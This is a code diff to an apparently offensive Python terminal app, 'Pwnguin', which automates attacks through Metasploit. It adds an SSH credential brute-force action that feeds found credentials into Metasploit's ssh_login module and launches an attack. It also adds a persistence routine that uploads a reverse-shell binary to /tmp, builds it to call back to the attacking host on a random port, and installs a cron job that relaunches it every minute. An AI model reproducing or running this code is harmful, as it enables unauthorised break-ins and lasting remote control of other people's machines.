@@ -3,9 +3,11 @@ import subprocess
 from time import sleep
 from pathlib import Path
 import ipaddress
+import random as rng
 
 import autopwn
 import sequences
+import getSSH
 import post.postexploit as postexploit
 import computer
 from computer import Computer
@@ -93,7 +95,7 @@ default_payloads = [
 class Tile1(Static):
 
     def compose(self) -> ComposeResult:
-        yield OptionList("Scan computer", "Scan network")
+        yield OptionList("Scan computer", "Scan network", "Bruteforce SSH")
 
     def on_mount(self) -> None:
         self.border_title = "Action Type"
@@ -101,10 +103,12 @@ class Tile1(Static):
     @on(OptionList.OptionHighlighted)
     def show_selected(self, event: OptionList.OptionHighlighted) -> None:
         input = self.parent.query_one("#command", Input)
-        if event.option_index == 1:
-            input.placeholder = "Enter network with mask (default: 192.168.1.0/24)"
-        elif event.option_index == 0:
+        if event.option_index == 0:
             input.placeholder = "Enter computer IP with mask (default: 127.0.0.1/8)"
+        elif event.option_index == 1:
+            input.placeholder = "Enter network with mask (default: 192.168.1.0/24)"
+        elif event.option_index == 2:
+            input.placeholder = "Enter the target IP with mask to bruteforce ssh creds (only local) (default: 127.0.0.1/8)"
         STATE["action"] = event.option_index
 
     @on(OptionList.OptionSelected)
@@ -146,6 +150,15 @@ class Tile2(Static):
             # assure that the IP is a network ip
             command = str(ipaddress.ip_network(command, strict=False))
             self.perform_network_scan(command)
+        elif STATE["action"] == 2:
+            if not command:
+                command = "127.0.0.1/8"
+            if not re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}\/[0-9]{1,2}$").match(
+                command
+            ):
+                input.placeholder = "Wrong format (default: 127.0.0.1/8)"
+                return
+            self.perform_bruteforce_ssh(command)
         input.placeholder = "let's go !"
         pretty = self.parent.query_one("#logs", Pretty)
         pretty.update("Scanning " + command)
@@ -162,7 +175,7 @@ class Tile2(Static):
 
         if ip not in STATE["computers"]:
             STATE["computers"][ip] = Computer()
-        self.app.call_from_thread(self.parent.query_one(Tile4).rebuild_tree)
+            self.app.call_from_thread(self.parent.query_one(Tile4).rebuild_tree)
 
         autopwn.getEdbExploit(result, get_all=True)
         self.app.call_from_thread(self.parent.query_one("#logs", Pretty).update, result)
@@ -186,6 +199,33 @@ class Tile2(Static):
             if full_ip not in STATE["computers"]:
                 STATE["computers"][full_ip] = Computer()
         self.app.call_from_thread(self.parent.query_one(Tile4).rebuild_tree)
+
+    @work(exclusive=True, thread=True)
+    def perform_bruteforce_ssh(self, ip: str) -> None:
+        if ip not in STATE["computers"]:
+            STATE["computers"][ip] = Computer()
+            self.app.call_from_thread(self.parent.query_one(Tile4).rebuild_tree)
+        usr, pwd = getSSH.getSshCredsAndConn(ip.split("/")[0])
+        if not usr:
+            self.app.call_from_thread(
+                self.parent.query_one("#logs", Pretty).update,
+                "No credentials found for the target",
+            )
+            return
+        client: MsfRpcClient = STATE["client"]
+        exploit = client.modules.use("auxiliary", "scanner/ssh/ssh_login")
+        exploit["USERNAME"] = usr
+        exploit["PASSWORD"] = pwd
+        exploit["RHOSTS"] = ip.split("/")[0]
+        STATE["exploit_ms"] = exploit
+        STATE["payload_ms"] = None
+        self.app.call_from_thread(
+            self.parent.query_one("#logs", Pretty).update,
+            f"creds found: {usr}:{pwd} - launching attack",
+        )
+        self.app.call_from_thread(
+            self.app.query_one(ParamMenu).launch_attack, STATE["IP"], True
+        )
 
 
 class Tile3(Static):
@@ -431,11 +471,11 @@ class ParamMenu(Static):
             else:
                 STATE["payload_ms"][param_name] = param_value
         self.app.query_one("#logs", Pretty).update("Okayy let's goo !")
-        self.launch_attack(STATE["IP"])
+        self.launch_attack(STATE["IP"], True)
 
     @work(exclusive=True, thread=True)
-    # TODO set infected via "ip_source attack/mask:port" (exemple: "192.168.55.41/24:55555") + autoroute + port forwarding for ctrl serv
-    def launch_attack(self, ip_source_attack: str):
+    # TODO add autoroute
+    def launch_attack(self, ip_source_attack: str, persistence: bool) -> None:
         client: MsfRpcClient = STATE["client"]
         exploit = STATE["exploit_ms"]
         payload = STATE["payload_ms"]
@@ -447,6 +487,7 @@ class ParamMenu(Static):
         new_sess_id = [
             element for element in new_sessions if element not in STATE["sessions"]
         ][0]
+
         # upgrading session to meterpreter
         if new_sessions[new_sess_id]["type"] == "shell":
             self.app.call_from_thread(
@@ -467,6 +508,38 @@ class ParamMenu(Static):
         shell.write(
             f"portfwd add -R -l {STATE['ctrlservport']} -L {ip_source_attack.split('/')[0]} -p {STATE['ctrlservport']}"
         )
+        sleep(2)
+
+        # persistence
+        if persistence:
+            persistence_port = rng.randint(5000, 65535)
+            shell.write("upload ./post/vir/revshell /tmp/revshell")
+            sleep(2)
+            shell.write("shell")
+            sleep(1)
+            self.app.call_from_thread(
+                self.app.query_one("#logs", Pretty).update,
+                "Setting up persistence on the machine via cron job...",
+            )
+            subprocess.run(
+                f"./post/shellgen.sh {ip_source_attack.split('/')[0]} {persistence_port} elf",
+                shell=True,
+            )
+            shell.write("chmod +x /tmp/revshell")
+            sleep(1)
+            shell.write(
+                "(crontab -l ; echo \"* * * * * pgrep -x 'revshell' || /tmp/revshell \")|crontab -"
+            )
+            sleep(1)
+            shell.write(">")
+            sleep(1)
+            full_ip = computer.find_full_ip(
+                new_sessions[new_sess_id]["tunnel_peer"].split(":")[0],
+                STATE["computers"],
+            )
+            STATE["computers"][full_ip].set_infection(
+                True, via=ip_source_attack, port=persistence_port
+            )
 
         STATE["sessions"] = new_sessions
         self.app.call_from_thread(
@@ -742,7 +815,9 @@ class Pwnguin(App):
                 self.call_from_thread(logs.update, "reconnecting " + action_l[1])
                 payload["LHOST"] = action_l[3].split("/")[0]
                 payload["LPORT"] = action_l[6]
-                task = self.call_from_thread(paramMenu.launch_attack, action_l[3])
+                task = self.call_from_thread(
+                    paramMenu.launch_attack, action_l[3], False
+                )
                 while task.is_running:
                     pass
             else:
@@ -769,3 +844,4 @@ if __name__ == "__main__":
     computer.save(STATE["computers"])
     subprocess.run("kill $(ps aux | grep 'msfrpcd' | awk '{print $2}')", shell=True)
     STATE["ctrlservproc"].kill()
+# TODO add nmap scan on remote machine
